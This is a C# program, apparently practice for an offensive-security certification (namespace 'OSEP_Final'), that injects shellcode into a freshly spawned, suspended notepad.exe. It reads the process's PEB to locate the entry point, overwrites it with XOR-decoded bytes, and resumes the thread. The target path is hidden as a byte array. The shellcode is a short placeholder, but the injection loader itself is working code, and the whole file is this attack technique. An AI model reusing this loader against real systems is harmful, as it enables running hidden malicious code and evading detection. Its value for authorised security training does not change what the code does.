using System;
using System.Runtime.InteropServices;
using System.Text;

namespace OSEP_Final
{
    class Program
    {
        // --- STRUCTS DO WINDOWS ---
        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public uint cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebBaseAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniqueProcessId;
            public IntPtr Reserved4;
        }

        // --- IMPORTAÇÕES DE APIs ---
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation
        );

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int ZwQueryInformationProcess(
            IntPtr hProcess,
            int procInformationClass,
            ref PROCESS_BASIC_INFORMATION procInformation,
            uint ProcInfoLen,
            out uint retlen
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesRead
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int nSize,
            out IntPtr lpNumberOfBytesWritten
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint ResumeThread(IntPtr hThread);

        static void Main(string[] args)
        {
            string targetProcess = Encoding.UTF8.GetString(new byte[] {
                0x43, 0x3A, 0x5C, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x5C, 0x53,
                0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x6E, 0x6F, 0x74, 0x65,
                0x70, 0x61, 0x64, 0x2E, 0x65, 0x78, 0x65
            }); // "C:\\Windows\\System32\\notepad.exe"

            byte[] encryptedShellcode = new byte[] {
                0xFA, 0x9B, 0xEA, 0x12, 0x45, 0x78, 0x9C, 0xAB, 
                0x33, 0xCC, 0x7F, 0x21, 0x88, 0x4D, 0xEF, 0x56 
            };

            byte[] buf = new byte[encryptedShellcode.Length];
            for (int i = 0; i < encryptedShellcode.Length; i++)
            {
                buf[i] = (byte)(encryptedShellcode[i] ^ 0xAA);
            }

            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi;
            bool success = CreateProcess(
                null,
                targetProcess,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                0x00000004, 
                IntPtr.Zero,
                null,
                ref si,
                out pi
            );

            if (!success)
            {
                Console.WriteLine("[!] CreateProcess failed. Error: " + Marshal.GetLastWin32Error());
                return;
            }

            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
            uint retLen;
            ZwQueryInformationProcess(pi.hProcess, 0, ref pbi, (uint)Marshal.SizeOf(pbi), out retLen);

            IntPtr imageBaseOffset = (IntPtr)((Int64)pbi.PebBaseAddress + 0x10);
            byte[] imageBaseBytes = new byte[8];
            IntPtr bytesRead;
            ReadProcessMemory(pi.hProcess, imageBaseOffset, imageBaseBytes, imageBaseBytes.Length, out bytesRead);
            IntPtr imageBase = (IntPtr)BitConverter.ToInt64(imageBaseBytes, 0);

            byte[] peHeader = new byte[0x200];
            ReadProcessMemory(pi.hProcess, imageBase, peHeader, peHeader.Length, out bytesRead);

            uint e_lfanew = BitConverter.ToUInt32(peHeader, 0x3C);
            uint entrypointRva = BitConverter.ToUInt32(peHeader, (int)(e_lfanew + 0x28));
            IntPtr entryPoint = (IntPtr)((UInt64)imageBase + entrypointRva);

            IntPtr bytesWritten;
            WriteProcessMemory(pi.hProcess, entryPoint, buf, buf.Length, out bytesWritten);

            ResumeThread(pi.hThread);
            Console.WriteLine("[+] Shellcode injected!");
        }
    }
}
